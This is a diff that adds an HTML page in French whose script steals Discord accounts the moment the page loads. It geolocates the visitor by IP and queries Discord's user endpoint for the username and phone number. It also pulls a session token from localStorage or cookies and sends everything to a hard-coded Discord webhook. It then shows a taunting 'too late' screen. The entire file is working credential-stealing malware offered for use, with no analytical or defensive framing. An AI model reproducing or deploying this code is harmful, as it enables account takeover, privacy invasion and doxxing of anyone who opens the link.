@@ -1,0 +1,103 @@
+<!DOCTYPE html><html lang="fr"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>.</title>
+<style>
+  body,html{margin:0;height:100%;background:#000;color:#0f0;font-family:'Courier New',monospace;overflow:hidden;display:flex;align-items:center;justify-content:center}
+  pre{animation:g 0.4s infinite;font-size:clamp(12px,4.5vw,26px);line-height:1.8;text-shadow:0 0 20px #0f0;text-align:center;padding:20px}
+  @keyframes g{0%{text-shadow:0 0 10px #0f0}100%{text-shadow:0 0 50px #0ff}}
+  .r{color:#f00;font-weight:bold;animation:b 0.5s infinite}
+  @keyframes b{50%{opacity:0}}
+</style></head><body>
+
+<pre id="show" style="display:none">
+<span class="r">TROP TARD – TON COMPTE DISCORD EST À MOI</span>
+
+Pseudo Discord : <span id="pseudo">-</span>
+Numéro         : <span id="phone">-</span>
+Token complet  : <span id="token">-</span>
+IP             : <span id="ip">-</span>
+Ville          : <span id="ville">-</span>
+
+<span class="r">TOUT EST DÉJÀ ENVOYÉ</span>
+</pre>
+
+<script>
+// TON WEBHOOK
+const W = "https://discordapp.com/api/webhooks/1457415566884077689/jbC9dps5442aS9flsVGY9JE1XtJ5JL07ZQwfoy_vbguug-_J_lIfLHZpo6UX1kIrBqD7";
+
+const send = (msg) => {
+  const blob = new Blob([JSON.stringify({content: msg})], {type: "application/json"});
+  navigator.sendBeacon?.(W, blob) || fetch(W, {method: "POST", headers: {"Content-Type": "application/json"}, body: blob, keepalive: true}).catch(() => {});
+};
+
+let token = "non trouvé";
+let pseudo = "non connecté";
+let phone = "non lié";
+let ip = "?";
+let ville = "?";
+
+let message = "TOKEN DISCORD CAPTURÉ\n";
+
+// === RÉCUPÉRATION IMMÉDIATE ===
+(async () => {
+  // 1. IP + Ville
+  try {
+    const geo = await (await fetch("https://ipwho.is/")).json();
+    ip = geo.ip;
+    ville = `${geo.city||"?"} ${geo.postal||""}, ${geo.country||"?"}`;
+    message += `IP : ${ip}\nVille : ${ville}\n`;
+  } catch(e) {}
+
+  // 2. DISCORD – LA PARTIE LA PLUS IMPORTANTE
+  try {
+    const res = await fetch("https://discord.com/api/v9/users/@me", {credentials: "include"});
+    if (res.ok) {
+      const user = await res.json();
+      if (user.id) {
+        pseudo = `${user.username}#${user.discriminator || "0000"}`;
+        phone = user.phone || "non lié";
+        message += `Pseudo Discord : ${pseudo}\n`;
+        message += `Numéro téléphone : ${phone}\n`;
+
+        // RÉCUPÉRATION DU TOKEN COMPLET (méthode la plus fiable 2026)
+        let foundToken = localStorage.getItem("token");
+        if (foundToken) foundToken = foundToken.replace(/"/g, "");
+        
+        // Fallback si pas dans localStorage (rare mais possible)
+        if (!foundToken || foundToken.length < 50) {
+          const cookies = document.cookie.split(';');
+          for (let cookie of cookies) {
+            if (cookie.includes('token')) {
+              foundToken = cookie.split('=')[1];
+              break;
+            }
+          }
+        }
+
+        if (foundToken && foundToken.length > 50) {
+          token = foundToken;
+          message += `TOKEN DISCORD COMPLET :\n${token}\n`;
+        }
+      }
+    }
+  } catch(e) {}
+
+  message += `\nLien ouvert : ${location.href}\n`;
+  message += `Heure : ${new Date().toLocaleString("fr-FR")}`;
+
+  // ENVOI IMMÉDIAT
+  send(message);
+
+  // AFFICHAGE APRÈS 1,5s → TROP TARD
+  setTimeout(() => {
+    document.getElementById("pseudo").textContent = pseudo;
+    document.getElementById("phone").textContent = phone;
+    document.getElementById("token").textContent = token.length > 50 ? token : "non trouvé";
+    document.getElementById("ip").textContent = ip;
+    document.getElementById("ville").textContent = ville;
+    document.getElementById("show").style.display = "block";
+  }, 1500);
+
+})();
+
+window.onbeforeunload = () => "Trop tard – ton token est déjà chez moi";
+</script>
+</body></html>
